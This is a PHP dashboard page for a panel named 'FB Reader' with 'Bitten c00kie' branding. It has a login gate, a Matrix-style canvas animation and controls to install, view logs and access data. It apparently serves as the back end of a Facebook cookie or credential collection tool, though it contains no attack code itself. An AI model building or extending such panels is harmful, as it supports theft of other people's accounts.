<?php

if( session_status() == PHP_SESSION_NONE ){
  session_start();
}

if(!$_SESSION['auth']){
  header("Location: index.php");
  exit;
}

include('Config.php');

?>
<!DOCTYPE html>
  <html>
    <head>
      <title>FB Reader</title>
       <link rel="stylesheet" type="text/css" href="s.css">
       <meta charset="UTF-8">
       <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
       <meta name="viewport" content="width=device-width, initial-scale=1">
      <!--===============================================================================================-->
       <link rel="icon" type="image/png" href="assets/images/icons/favicon.ico"/>
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/fonts/iconic/css/material-design-iconic-font.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/animate/animate.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/animsition/css/animsition.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/select2/select2.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/daterangepicker/daterangepicker.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/css/util.css">
       <link rel="stylesheet" type="text/css" href="assets/css/main.css">
      <!--===============================================================================================-->
       <script>
        window.onload = function(){
          var c = document.getElementById("c");
   var ctx = c.getContext("2d");

   //making the canvas full screen
   c.height = window.innerHeight;
   c.width = window.innerWidth;

   //chinese characters - taken from the unicode charset
   var chinese = "田由甲申甴电甶男甸甹町画甼甽甾甿畀畁畂畃畄畅畆畇畈畉畊畋界畍畎畏畐畑";
   //converting the string into an array of single characters
   chinese = chinese.split("");

   var font_size = 10;
   var columns = c.width/font_size; //number of columns for the rain
   //an array of drops - one per column
   var drops = [];
   //x below is the x coordinate
   //1 = y co-ordinate of the drop(same for every drop initially)
   for(var x = 0; x < columns; x++)
    drops[x] = 1;

    //Crazy title

    function titleRand(){
      let chars = [
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)]
      ];
      window.document.title = chars.join('');
    }

   //drawing the characters
   function draw()
   {
     titleRand();
    //Black BG for the canvas
    //translucent BG to show trail
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, c.width, c.height);

    ctx.fillStyle = "#ff0230"; //green text
    ctx.font = font_size + "px courier";
    //looping over drops
    for(var i = 0; i < drops.length; i++)
    {
      //a random chinese character to print
      var text = chinese[Math.floor(Math.random()*chinese.length)];
      //x = i*font_size, y = value of drops[i]*font_size
      ctx.fillText(text, i*font_size, drops[i]*font_size);

      //sending the drop back to the top randomly after it has crossed the screen
      //adding a randomness to the reset to make the drops scattered on the Y axis
      if(drops[i]*font_size > c.height && Math.random() > 0.975)
        drops[i] = 0;

      //incrementing Y coordinate
      drops[i]++;
    }
   }
   setInterval(draw, 27);
        }
       </script>
    </head>
    <body>
      <div id="navbar">

        <div id="navbar-minilogo">
          <i class="fas fa-cookie-bite"></i>
          <span id="navbar-mininame">Bitten c00kie</span>
        </div>

        <div id="navbar-logout">
          <span id="user-info">
            <img src="<?php echo getUserPicture($_SESSION['username']); ?>" width="40" height="40"> @<?php echo $_SESSION['username']; ?> -
          </span>
          <a href="logout.php">Log out</a>
        </div>
      </div>
      <canvas id="c"></canvas>
        <div id="content">


<div id="cpanel">
  <h2>CONTROL PANEL</h2>
  <div id="cpanel-item-container">
    <div id="cpanel-item-left">

      <div id="cpanel-item" onclick="location.href='install.php';">
        <i class="fas fa-download"></i>
        <span id="cpanel-item-caption">Install here</span>
      </div>
      <div id="cpanel-item" onclick="location.href='view.php';">
        <i class="fas fa-cloud"></i>
        <span id="cpanel-item-caption">View logs</span>
      </div>
      <div id="cpanel-item" onclick="snack('This function is for premium users.')">
        <i class="fas fa-key"></i>
        <span id="cpanel-item-caption">My data</span>
      </div>

    </div>
    <div id="cpanel-item-right">

      <div id="cpanel-item" onclick="snack('Option not enabled yet.')">
        <i class="fas fa-trash"></i>
        <span id="cpanel-item-caption">Clear all</span>
      </div>

    </div>



  </div>
</div>

          <div id="changelog">
            <h2>Changelog</h2><br>
            <textarea disabled><?php foreach($list as $item){ echo $item[0] . ' ' . $item[1]; } ?></textarea>
          </div>


        </div>
<div id="snackbar">Some text some message..</div>
        <!--===============================================================================================-->
          <script src="assets/vendor/jquery/jquery-3.2.1.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/vendor/animsition/js/animsition.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/vendor/bootstrap/js/popper.js"></script>
          <script src="assets/vendor/bootstrap/js/bootstrap.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/js/main.js"></script>
    </body>
  </html>
